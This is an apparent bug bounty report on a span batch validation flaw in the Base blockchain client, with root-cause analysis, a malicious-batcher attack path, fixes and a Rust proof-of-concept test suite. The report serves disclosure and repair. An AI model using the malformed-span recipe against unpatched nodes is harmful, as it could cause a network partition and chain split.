# 75623 bc medium post holocene span batch prefix validation can allow partially derived batches from a span rejected by full validation

**Submitted on Apr 30th 2026 at 05:51:36 UTC by @Petrate for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75623
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Unintended chain split (network partition)

## Description

Base's post-Holocene span batch derivation flow relies on `check_batch_prefix` for span acceptance and `get_singular_batches` for conversion to single batches, without an intervening full `check_batch` validation. Two bugs interact in this flow:

{% stepper %}
{% step %}

### `get_singular_batches` uses a relative slice index as if it were absolute

In `SpanBatch::get_singular_batches` (span.rs:301):

```rust
let mut origin_index = 0;
for batch in &self.batches {
    let origin_epoch_hash = l1_origins[origin_index..l1_origins.len()]
        .iter()
        .enumerate()
        .find_map(|(i, b)| {
            if b.number == batch.epoch_num {
                origin_index = i;  // <-- BUG: i is slice-relative, not absolute
                Some(b.hash)
            } else {
                None
            }
        })
        ...
}
```

The slice `l1_origins[origin_index..l1_origins.len()]` produces relative indices via `enumerate()`. Storing `i` (relative) as `origin_index` (absolute) desynchronizes the cursor.

The same file's full `check_batch` (span.rs:427) uses the correct pattern:

```rust
let Some((offset, l1_origin)) =
    l1_blocks[origin_index..].iter().enumerate().find(|(_, b)| batch_epoch == b.number)
else {
    return BatchValidity::Drop(BatchDropReason::MissingL1Origin);
};
origin_index += offset;  // <-- correct: relative offset advances absolute index
```

The two functions in the same file use inconsistent index logic. The conversion path can move the cursor backward when the relative index is smaller than the absolute index it overwrites — producing a `(epoch_num, epoch_hash)` pair where the hash is for a block earlier than expected.
{% endstep %}

{% step %}

### `check_batch_prefix` does not enforce interior monotonicity

In `SpanBatch::check_batch_prefix` (span.rs:591–750), the L1 origin check loops through `l1_origins` and validates only the END of the span:

```rust
let end_epoch_num = self.batches.last().unwrap().epoch_num;
let mut origin_checked = false;
for l1_block in l1_origins {
    if l1_block.number == end_epoch_num {
        if !self.check_origin_hash(l1_block.hash) {
            return (BatchValidity::Drop(BatchDropReason::EpochHashMismatch), None);
        }
        origin_checked = true;
        break;
    }
}
```

This validates that the FINAL span element's L1 origin hash matches `self.l1_origin_check`. It does NOT walk middle elements to verify monotonicity. A non-monotonic interior sequence (e.g., 11 → 13 → 12) where the final element correctly matches `l1_origin_check` will pass.

The full `check_batch` walks every element and rejects on `MissingL1Origin` when the cursor can't find the next epoch in the forward-only slice — catching non-monotonicity by construction.
{% endstep %}
{% endstepper %}

### Root cause 3 — BatchStream calls prefix only before conversion

In `BatchStream::next_batch` (batch\_stream.rs:144–183):

```rust
match batch_with_inclusion.batch {
    Batch::Single(b) => return Ok(Batch::Single(b)),
    Batch::Span(b) => {
        let (validity, _) = b.check_batch_prefix(...).await;
        match validity {
            BatchValidity::Accept => self.span = Some(b),  // <-- stored without full validation
            ...
        }
    }
}
```

In `BatchStream::try_hydrate_buffer` (batch\_stream.rs:88–102):

```rust
self.buffer.extend(span.get_singular_batches(l1_origins, parent)?);
```

The flow is: prefix accept → store span → convert via `get_singular_batches` → emit singles. **No full `check_batch` invocation between accept and conversion.**

## Attack path

{% stepper %}
{% step %}

### Malicious batcher submits a malformed span

A malicious batcher submits a Holocene-era span batch with non-monotonic L1 origins, e.g., elements with `epoch_num = [11, 13, 12]`. Sets `parent_check` and `l1_origin_check` (over the LAST element's L1 hash) correctly.
{% endstep %}

{% step %}

### Prefix validation accepts the span

`BatchStream::next_batch` calls `check_batch_prefix`. The function:

* Checks parent\_check matches L2 safe head ✓
* Checks `l1_origin_check` matches the last element's (epoch=12) L1 hash ✓
* Does not walk interior elements
* Returns `Accept`
  {% endstep %}

{% step %}

### The span is stored and converted

`BatchStream` stores the span. Later `try_hydrate_buffer` calls `get_singular_batches`.
{% endstep %}

{% step %}

### `get_singular_batches` emits malformed single batches

`get_singular_batches` walks elements:

* Element 0 (epoch 11): finds at slice \[0..] index 1. Sets `origin_index = 1`. Emits `SingleBatch(epoch=11, hash=l1_origins[1].hash)`. ✓
* Element 1 (epoch 13): finds at slice \[1..] index 2. Sets `origin_index = 2` (should be 3 absolute). Emits `SingleBatch(epoch=13, hash=l1_origins[3].hash)`. The cursor is now stale.
* Element 2 (epoch 12): finds at slice \[2..] index 0. Sets `origin_index = 0`. Emits `SingleBatch(epoch=12, hash=l1_origins[2].hash)`. **Cursor moved backward.**
  {% endstep %}

{% step %}

### Downstream validation accepts a prefix of the emitted singles

Three single batches are pushed downstream. `BatchValidator::next_batch` validates them independently. The first emits successfully (epoch 11 advances from L2 safe head's L1 origin 10). Subsequent emissions are validated against `SingleBatch::check_batch`'s own rules (which don't reproduce the span-level monotonicity check).
{% endstep %}

{% step %}

### Malformed suffix is rejected only after partial state has advanced

With the longer malformed pattern `[11, 12, 14, 13]` (PoC test 4), the first two emissions (11, 12) pass downstream validation before the suffix (14, 13) is rejected. **State has already advanced two blocks based on the malformed span.**
{% endstep %}

{% step %}

### Honest nodes diverge

An honest implementation following the spec rejects the whole span at full `check_batch`, produces deposit-only blocks for the L1 origin epoch (Holocene fast-channel-invalidation), and maintains a different L2 state than Base's flow.
{% endstep %}
{% endstepper %}

## Affected files

* `crates/consensus/protocol/src/batch/span.rs` lines 301–335 (`get_singular_batches`, the relative-index bug)
* `crates/consensus/protocol/src/batch/span.rs` lines 416–428 (full `check_batch`, the correct reference for `+= offset`)
* `crates/consensus/protocol/src/batch/span.rs` lines 591–750 (`check_batch_prefix`, the incomplete prefix validation)
* `crates/consensus/derive/src/stages/batch/batch_stream.rs` lines 88–102 (`try_hydrate_buffer` calls `get_singular_batches` without intervening full validation)
* `crates/consensus/derive/src/stages/batch/batch_stream.rs` lines 144–183 (`next_batch` accepts spans on prefix only)
* `crates/consensus/derive/src/stages/batch/batch_validator.rs` lines 240–263 (downstream single-batch validation)

## Link to affected files

* <https://github.com/base/base/blob/main/crates/consensus/protocol/src/batch/span.rs#L301–L335>
* <https://github.com/base/base/blob/main/crates/consensus/protocol/src/batch/span.rs#L416–L428>
* <https://github.com/base/base/blob/main/crates/consensus/protocol/src/batch/span.rs#L591–L750>
* <https://github.com/base/base/blob/main/crates/consensus/derive/src/stages/batch/batch\\_stream.rs#L88–L102>
* <https://github.com/base/base/blob/main/crates/consensus/derive/src/stages/batch/batch\\_stream.rs#L144–L183>
* <https://github.com/base/base/blob/main/crates/consensus/derive/src/stages/batch/batch\\_validator.rs#L240–L263>

## Root cause 1 — `get_singular_batches` uses relative index as absolute

In `SpanBatch::get_singular_batches` (span.rs:301):

```rust
let mut origin_index = 0;
for batch in &self.batches {
    let origin_epoch_hash = l1_origins[origin_index..l1_origins.len()]
        .iter()
        .enumerate()
        .find_map(|(i, b)| {
            if b.number == batch.epoch_num {
                origin_index = i;  // <-- BUG: i is slice-relative, not absolute
                Some(b.hash)
            } else {
                None
            }
        })
        ...
}
```

The slice `l1_origins[origin_index..l1_origins.len()]` produces relative indices via `enumerate()`. Storing `i` (relative) as `origin_index` (absolute) desynchronizes the cursor.

The same file's full `check_batch` (span.rs:427) uses the correct pattern:

```rust
let Some((offset, l1_origin)) =
    l1_blocks[origin_index..].iter().enumerate().find(|(_, b)| batch_epoch == b.number)
else {
    return BatchValidity::Drop(BatchDropReason::MissingL1Origin);
};
origin_index += offset;  // <-- correct: relative offset advances absolute index
```

The two functions in the same file use inconsistent index logic. The conversion path can move the cursor backward when the relative index is smaller than the absolute index it overwrites — producing a `(epoch_num, epoch_hash)` pair where the hash is for a block earlier than expected.

## Root cause 2 — `check_batch_prefix` does not enforce interior monotonicity

In `SpanBatch::check_batch_prefix` (span.rs:591–750), the L1 origin check loops through `l1_origins` and validates only the END of the span:

```rust
let end_epoch_num = self.batches.last().unwrap().epoch_num;
let mut origin_checked = false;
for l1_block in l1_origins {
    if l1_block.number == end_epoch_num {
        if !self.check_origin_hash(l1_block.hash) {
            return (BatchValidity::Drop(BatchDropReason::EpochHashMismatch), None);
        }
        origin_checked = true;
        break;
    }
}
```

This validates that the FINAL span element's L1 origin hash matches `self.l1_origin_check`. It does NOT walk middle elements to verify monotonicity. A non-monotonic interior sequence (e.g., 11 → 13 → 12) where the final element correctly matches `l1_origin_check` will pass.

The full `check_batch` walks every element and rejects on `MissingL1Origin` when the cursor can't find the next epoch in the forward-only slice — catching non-monotonicity by construction.

## Root cause 3 — BatchStream calls prefix only before conversion

In `BatchStream::next_batch` (batch\_stream.rs:144–183):

```rust
match batch_with_inclusion.batch {
    Batch::Single(b) => return Ok(Batch::Single(b)),
    Batch::Span(b) => {
        let (validity, _) = b.check_batch_prefix(...).await;
        match validity {
            BatchValidity::Accept => self.span = Some(b),  // <-- stored without full validation
            ...
        }
    }
}
```

In `BatchStream::try_hydrate_buffer` (batch\_stream.rs:88–102):

```rust
self.buffer.extend(span.get_singular_batches(l1_origins, parent)?);
```

The flow is: prefix accept → store span → convert via `get_singular_batches` → emit singles. **No full `check_batch` invocation between accept and conversion.**

## Recommended fix

Two changes are needed; either alone is insufficient.

**Fix 1: Correct the index in `get_singular_batches`.**

```rust
// Before:
origin_index = i;

// After:
origin_index += i;
```

This makes `get_singular_batches` consistent with full `check_batch` (which uses `origin_index += offset`). Non-monotonic L1 origins will then cause a `find` failure (no element matches in the forward-cursor view), and the conversion will fail rather than silently emit malformed singles.

**Fix 2: Run full `check_batch` before conversion.**

In `BatchStream::next_batch` (or before `try_hydrate_buffer` calls `get_singular_batches`), invoke `check_batch` after `check_batch_prefix` accepts. This catches any structural span issue that the prefix doesn't enforce.

Alternatively, extend `check_batch_prefix` to walk interior elements for monotonicity. But the most robust fix is to call full validation before treating the span as ready for conversion — this matches the OP-stack reference implementation's behavior and ensures any future divergence between prefix and full validation does not produce derivation bugs.

A regression test should cover:

* Span with non-monotonic L1 origins (e.g., \[11, 13, 12]) — must be rejected before any single batch is emitted.
* Span with skip-then-backtrack (e.g., \[11, 12, 14, 13]) — must be rejected before any single batch is emitted.
* Span with strictly monotonic but non-contiguous origins (e.g., \[11, 12, 14] — skipping 13) — confirm correct handling.

## Link to Proof of Concept

<https://gist.github.com/devpetrate/430240456b983059465d8abae30f9d66>

## Proof of Concept

The PoC is a standalone integration test and should be placed at:

```
crates/consensus/protocol/tests/span_origin_index_poc.rs
```

Run it with:

```bash
cargo test -p base-protocol --test span_origin_index_poc -- --nocapture
```

PoC:

```rust
#![allow(missing_docs)]
use alloy_eips::BlockNumHash;
use alloy_primitives::B256;
use base_protocol::{BlockInfo, L2BlockInfo, SpanBatch, SpanBatchElement};

fn l1_blocks(start_num: u64, count: u64) -> Vec<BlockInfo> {
    (0..count)
        .map(|i| BlockInfo {
            number: start_num + i,
            timestamp: i * 10,
            hash: B256::left_padding_from(&(start_num + i).to_be_bytes()),
            ..Default::default()
        })
        .collect()
}

#[test]
fn poc_get_singular_batches_origin_index_uses_relative_offset() {
    let l1_blocks = l1_blocks(10, 5);

    let l2_safe_head = L2BlockInfo {
        block_info: BlockInfo {
            number: 100,
            timestamp: 0,
            ..Default::default()
        },
        l1_origin: BlockNumHash {
            number: 10,
            hash: l1_blocks[0].hash,
        },
        ..Default::default()
    };

    let span = SpanBatch {
        batches: vec![
            SpanBatchElement {
                epoch_num: 11,
                timestamp: 10,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 13,
                timestamp: 20,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 12,
                timestamp: 30,
                ..Default::default()
            },
        ],
        ..Default::default()
    };

    let singles = span
        .get_singular_batches(&l1_blocks, l2_safe_head)
        .expect("BUG REPRODUCED: non-monotonic L1 origins were accepted during span conversion");

    assert_eq!(singles.len(), 3);

    assert_eq!(singles[0].epoch_num, 11);
    assert_eq!(singles[0].epoch_hash, l1_blocks[1].hash);

    assert_eq!(singles[1].epoch_num, 13);
    assert_eq!(singles[1].epoch_hash, l1_blocks[3].hash);

    assert_eq!(
        singles[2].epoch_num, 12,
        "BUG REPRODUCED: conversion emitted epoch 12 after epoch 13"
    );
    assert_eq!(
        singles[2].epoch_hash, l1_blocks[2].hash,
        "BUG REPRODUCED: origin_index moved backwards because the relative slice index was stored as an absolute index"
    );

    println!(
        "BUG REPRODUCED: SpanBatch::get_singular_batches accepted non-monotonic epochs 11 -> 13 -> 12 because origin_index is assigned from a relative slice index"
    );
}

use alloy_primitives::FixedBytes;
use async_trait::async_trait;
use base_common_consensus::BaseBlock;
use base_common_genesis::{HardForkConfig, RollupConfig};
use base_protocol::{BatchDropReason, BatchValidationProvider, BatchValidity};

#[derive(Default, Debug)]
struct NoopBatchValidationProvider;

#[async_trait]
impl BatchValidationProvider for NoopBatchValidationProvider {
    type Error = &'static str;

    async fn l2_block_info_by_number(
        &mut self,
        _number: u64,
    ) -> Result<L2BlockInfo, Self::Error> {
        Err("not needed for this non-overlapping span")
    }

    async fn block_by_number(
        &mut self,
        _number: u64,
    ) -> Result<BaseBlock, Self::Error> {
        Err("not needed for this non-overlapping span")
    }
}

#[tokio::test]
async fn poc_prefix_accepts_span_that_full_validation_rejects_but_conversion_emits() {
    let l1_blocks = l1_blocks(10, 5);

    let safe_head_hash = B256::repeat_byte(0xAA);

    let l2_safe_head = L2BlockInfo {
        block_info: BlockInfo {
            number: 100,
            timestamp: 0,
            hash: safe_head_hash,
            ..Default::default()
        },
        l1_origin: BlockNumHash {
            number: 10,
            hash: l1_blocks[0].hash,
        },
        ..Default::default()
    };

    let span = SpanBatch {
        batches: vec![
    SpanBatchElement {
        epoch_num: 11,
        timestamp: 10,
        ..Default::default()
    },
    SpanBatchElement {
        epoch_num: 13,
        timestamp: 30,
        ..Default::default()
    },
    SpanBatchElement {
        epoch_num: 12,
        timestamp: 40,
        ..Default::default()
    },
],
        parent_check: FixedBytes::<20>::from_slice(&safe_head_hash[..20]),
        // Prefix validation checks the final span element's L1 origin hash.
        // The final element is epoch 12, even though the middle element jumped to 13.
        l1_origin_check: FixedBytes::<20>::from_slice(&l1_blocks[2].hash[..20]),
        ..Default::default()
    };

    let cfg = RollupConfig {
        block_time: 10,
        seq_window_size: 1000,
        max_sequencer_drift: 1000,
        hardforks: HardForkConfig {
            delta_time: Some(0),
            holocene_time: Some(0),
            ..Default::default()
        },
        ..Default::default()
    };

    let inclusion_block = BlockInfo {
        number: 20,
        timestamp: 100,
        ..Default::default()
    };

    let mut provider = NoopBatchValidationProvider;

    let (prefix_validity, parent_block) = span
        .check_batch_prefix(
            &cfg,
            &l1_blocks,
            l2_safe_head,
            &inclusion_block,
            &mut provider,
        )
        .await;

    assert_eq!(
        prefix_validity,
        BatchValidity::Accept,
        "PoC setup failed: prefix validation should accept this span"
    );

    assert!(
        parent_block.is_some(),
        "PoC setup failed: accepted prefix should return a parent block"
    );

    let full_validity = span
        .check_batch(
            &cfg,
            &l1_blocks,
            l2_safe_head,
            &inclusion_block,
            &mut provider,
        )
        .await;

    assert_eq!(
        full_validity,
        BatchValidity::Drop(BatchDropReason::MissingL1Origin),
        "PoC setup failed: full validation should reject the non-monotonic L1 origin sequence"
    );

    let singles = span
        .get_singular_batches(&l1_blocks, l2_safe_head)
        .expect("BUG REPRODUCED: conversion emitted singles even though full validation rejects the span");

    assert_eq!(singles.len(), 3);
    assert_eq!(singles[0].epoch_num, 11);
    assert_eq!(singles[1].epoch_num, 13);
    assert_eq!(singles[2].epoch_num, 12);

    println!(
        "BUG REPRODUCED: check_batch_prefix accepted a non-monotonic span, full check_batch rejected it, but get_singular_batches still emitted SingleBatch values"
    );
}

#[test]
fn poc_malformed_span_can_emit_a_valid_prefix_before_downstream_rejection() {
    let l1_blocks = l1_blocks(10, 5);

    let l2_safe_head = L2BlockInfo {
        block_info: BlockInfo {
            number: 100,
            timestamp: 0,
            hash: B256::repeat_byte(0xAA),
            ..Default::default()
        },
        l1_origin: BlockNumHash {
            number: 10,
            hash: l1_blocks[0].hash,
        },
        ..Default::default()
    };

    let span = SpanBatch {
        batches: vec![
            SpanBatchElement {
                epoch_num: 11,
                timestamp: 10,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 13,
                timestamp: 30,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 12,
                timestamp: 40,
                ..Default::default()
            },
        ],
        ..Default::default()
    };

    let singles = span
        .get_singular_batches(&l1_blocks, l2_safe_head)
        .expect("PoC setup failed: span conversion should emit singles");

    assert_eq!(singles.len(), 3);
    assert_eq!(singles[0].epoch_num, 11);
    assert_eq!(singles[1].epoch_num, 13);
    assert_eq!(singles[2].epoch_num, 12);

    let cfg = RollupConfig {
        block_time: 10,
        seq_window_size: 1000,
        max_sequencer_drift: 1000,
        hardforks: HardForkConfig {
            holocene_time: Some(0),
            ..Default::default()
        },
        ..Default::default()
    };

    let inclusion_block = BlockInfo {
        number: 20,
        timestamp: 100,
        ..Default::default()
    };

    let mut first = singles[0].clone();
    first.parent_hash = l2_safe_head.block_info.hash;

    let first_validity = first.check_batch(&cfg, &l1_blocks, l2_safe_head, &inclusion_block);

    assert_eq!(
        first_validity,
        BatchValidity::Accept,
        "PoC setup failed: first emitted SingleBatch should be accepted"
    );

    let parent_after_first = L2BlockInfo {
        block_info: BlockInfo {
            number: l2_safe_head.block_info.number + 1,
            timestamp: first.timestamp,
            hash: B256::repeat_byte(first.epoch_num as u8),
            ..Default::default()
        },
        l1_origin: BlockNumHash {
            number: first.epoch_num,
            hash: first.epoch_hash,
        },
        ..Default::default()
    };

    let mut second = singles[1].clone();
    second.parent_hash = parent_after_first.block_info.hash;

    let second_validity =
        second.check_batch(&cfg, &l1_blocks, parent_after_first, &inclusion_block);

    assert_ne!(
        second_validity,
        BatchValidity::Accept,
        "PoC setup failed: second malformed emitted SingleBatch should not be accepted"
    );

    println!(
        "BUG REPRODUCED: malformed span rejected by full validation can still emit a first SingleBatch that passes downstream validation before a later emitted batch is rejected: second_validity={second_validity:?}"
    );
}

#[tokio::test]
async fn poc_invalid_span_can_emit_multiple_valid_prefix_batches_before_rejection() {
    let l1_blocks = l1_blocks(10, 6);

    let safe_head_hash = B256::repeat_byte(0xAA);

    let l2_safe_head = L2BlockInfo {
        block_info: BlockInfo {
            number: 100,
            timestamp: 0,
            hash: safe_head_hash,
            ..Default::default()
        },
        l1_origin: BlockNumHash {
            number: 10,
            hash: l1_blocks[0].hash,
        },
        ..Default::default()
    };

    let span = SpanBatch {
        batches: vec![
            SpanBatchElement {
                epoch_num: 11,
                timestamp: 10,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 12,
                timestamp: 20,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 14,
                timestamp: 40,
                ..Default::default()
            },
            SpanBatchElement {
                epoch_num: 13,
                timestamp: 50,
                ..Default::default()
            },
        ],
        parent_check: FixedBytes::<20>::from_slice(&safe_head_hash[..20]),
        // Prefix validation checks only the final span element's L1 origin hash.
        // The final element is epoch 13, even though the span jumped to 14 before going back to 13.
        l1_origin_check: FixedBytes::<20>::from_slice(&l1_blocks[3].hash[..20]),
        ..Default::default()
    };

    let cfg = RollupConfig {
        block_time: 10,
        seq_window_size: 1000,
        max_sequencer_drift: 1000,
        hardforks: HardForkConfig {
            delta_time: Some(0),
            holocene_time: Some(0),
            ..Default::default()
        },
        ..Default::default()
    };

    let inclusion_block = BlockInfo {
        number: 20,
        timestamp: 100,
        ..Default::default()
    };

    let mut provider = NoopBatchValidationProvider;

    let (prefix_validity, parent_block) = span
        .check_batch_prefix(
            &cfg,
            &l1_blocks,
            l2_safe_head,
            &inclusion_block,
            &mut provider,
        )
        .await;

    assert_eq!(
        prefix_validity,
        BatchValidity::Accept,
        "PoC setup failed: prefix validation should accept this malformed span"
    );

    assert!(
        parent_block.is_some(),
        "PoC setup failed: accepted prefix should return a parent block"
    );

    let full_validity = span
        .check_batch(
            &cfg,
            &l1_blocks,
            l2_safe_head,
            &inclusion_block,
            &mut provider,
        )
        .await;

    assert_ne!(
        full_validity,
        BatchValidity::Accept,
        "PoC setup failed: full validation should reject this non-monotonic span"
    );

    let singles = span
        .get_singular_batches(&l1_blocks, l2_safe_head)
        .expect("BUG REPRODUCED: conversion emitted singles even though full validation rejects the span");

    assert_eq!(singles.len(), 4);
    assert_eq!(singles[0].epoch_num, 11);
    assert_eq!(singles[1].epoch_num, 12);
    assert_eq!(singles[2].epoch_num, 14);
    assert_eq!(singles[3].epoch_num, 13);

    let mut parent = l2_safe_head;
    let mut l1_window = l1_blocks.clone();
    let mut accepted_epochs = Vec::new();
    let mut rejected = None;

    for mut single in singles {
        single.parent_hash = parent.block_info.hash;

        let validity = single.check_batch(&cfg, &l1_window, parent, &inclusion_block);

        if validity == BatchValidity::Accept {
            accepted_epochs.push(single.epoch_num);

            parent = L2BlockInfo {
                block_info: BlockInfo {
                    number: parent.block_info.number + 1,
                    timestamp: single.timestamp,
                    hash: B256::repeat_byte(single.epoch_num as u8),
                    ..Default::default()
                },
                l1_origin: BlockNumHash {
                    number: single.epoch_num,
                    hash: single.epoch_hash,
                },
                ..Default::default()
            };

            while l1_window.len() > 1 && parent.l1_origin.number > l1_window[0].number {
                l1_window.remove(0);
            }
        } else {
            rejected = Some((single.epoch_num, validity));
            break;
        }
    }

    assert_eq!(
        accepted_epochs,
        vec![11, 12],
        "BUG REPRODUCED: expected the malformed span to emit at least two downstream-valid prefix batches"
    );

    let (rejected_epoch, rejected_validity) =
        rejected.expect("PoC setup failed: malformed suffix should eventually be rejected");

    assert_ne!(
        rejected_validity,
        BatchValidity::Accept,
        "PoC setup failed: malformed suffix should not be accepted"
    );

    println!(
        "BUG REPRODUCED: malformed span rejected by full validation emitted downstream-valid prefix epochs {:?} before rejecting epoch {} with {:?}",
        accepted_epochs,
        rejected_epoch,
        rejected_validity
    );
}
```

The PoC contains four tests.

The first test shows that `SpanBatch::get_singular_batches()` accepts a non monotonic L1 origin sequence because `origin_index` is assigned from a relative slice index.

The second test shows that `check_batch_prefix()` accepts the malformed span, while full `check_batch()` rejects the same span, and `get_singular_batches()` still emits single batches.

The third test shows that the malformed span can emit a first single batch that passes downstream single batch validation before the malformed suffix is rejected.

The fourth test shows that a longer malformed span can emit multiple downstream valid prefix batches before the malformed suffix is rejected.

Expected output:

```
running 4 tests
BUG REPRODUCED: SpanBatch::get_singular_batches accepted non-monotonic epochs 11 -> 13 -> 12 because origin_index is assigned from a relative slice index
BUG REPRODUCED: malformed span rejected by full validation can still emit a first SingleBatch that passes downstream validation before a later emitted batch is rejected
BUG REPRODUCED: malformed span rejected by full validation emitted downstream-valid prefix epochs [11, 12] before rejecting epoch 14 with Drop(FutureTimestampHolocene)
BUG REPRODUCED: check_batch_prefix accepted a non-monotonic span, full check_batch rejected it, but get_singular_batches still emitted SingleBatch values
test result: ok. 4 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```
